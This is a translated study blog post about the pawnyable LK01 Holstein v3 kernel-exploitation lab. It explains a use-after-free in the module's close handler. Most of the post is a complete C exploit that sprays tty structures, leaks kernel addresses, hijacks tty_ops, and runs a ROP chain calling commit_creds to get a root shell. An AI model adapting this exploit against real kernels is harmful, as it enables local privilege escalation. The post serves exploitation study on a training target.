---
title: "[KERNEL] Heap Use After Free"
description: "※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. This time we run it with Holstein v3. https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g"
date: "2024-11-14"
translation_key: "tistory-21ae322697ad"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-Heap-Use-After-Free"
private: false
---

**※ Since the analysis was conducted with reference to the data, there may be errors.** 

**※ If there is anything that needs to be supplemented or corrected, please let us know and we will check and take action.**

This time we perform it with Holstein v3.

[https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz](https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz)

In v2, g\_buf was allocated using kmalloc().

Moving to v3, memory leaks were prevented to some extent by performing allocation using kzalloc().

```
g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
if (!g_buf) {
 printk(KERN_INFO "kmalloc failed");
 return -ENOMEM;
}
```

When viewed as a function in the user area, kzalloc() initializes to 0 like calloc().

g\_buf is also allocated with kzalloc, and module\_read() and module\_write() also use the same safe functions as in v2. Where do vulnerabilities occur?

In v3, a vulnerability occurs in the part where memory is released.

```
static int module_close(struct inode *inode, struct file *file)
{
 printk(KERN_INFO "module_close called\n");
 kfree(g_buf);
 return 0;
}
```

Memory is freed via kfree(), but the pointer to g\_buf is not initialized.

If this happens, g\_buf will retain data for the heap area even after it is released.

Using this, it is possible to perform a UAF attack by reusing the released memory.

```
int fd1 = open("/dev/holstein", O_RDWR);
int fd2 = open("/dev/holstein", O_RDWR);
close(fd1);
write(fd2, "Hello", 5);
```

Kernel is written as above, taking advantage of the fact that resources among processes are shared.

In this case, fd1 is released, but the data is modified by write(), which writes a value to fd2.

By abusing this, the original function table can be overwritten with a fake func table address, making an exploit possible.

```
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <unistd.h>

unsigned long kbase, g_buf, current;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

#define ofs_tty_ops 0xc39c60
#define rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp (kbase + 0x14fbea)
#define rop_pop_rdi (kbase + 0x14078a)
#define rop_pop_rcx (kbase + 0x0eb7e4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x638e9b)
#define rop_bypass_kpti (kbase + 0x800e26)
#define addr_commit_creds (kbase + 0x0723c0)
#define addr_prepare_kernel_cred (kbase + 0x072560)

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  int fd1 = open("/dev/holstein", O_RDWR);
  int fd2 = open("/dev/holstein", O_RDWR);
  if (fd1 == -1 || fd2 == -1)
    fatal("/dev/holstein");
  close(fd1);

  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  char buf[0x400];
  read(fd2, buf, 0x400);
  kbase = *(unsigned long*)&buf[0x18] - ofs_tty_ops;
  g_buf = *(unsigned long*)&buf[0x38] - 0x38;
  printf("kbase = 0x%016lx\n", kbase);
  printf("g_buf = 0x%016lx\n", g_buf);

  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  *(unsigned long*)&buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;

  write(fd2, buf, 0x400);

  int fd3 = open("/dev/holstein", O_RDWR);
  int fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 == -1 || fd4 == -1)
    fatal("/dev/holstein");
  close(fd3);
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  read(fd4, buf, 0x400);
  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
  write(fd4, buf, 0x20);

  for (int i = 50; i < 100; i++) {
    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
  }

  getchar();
  return 0;
}
```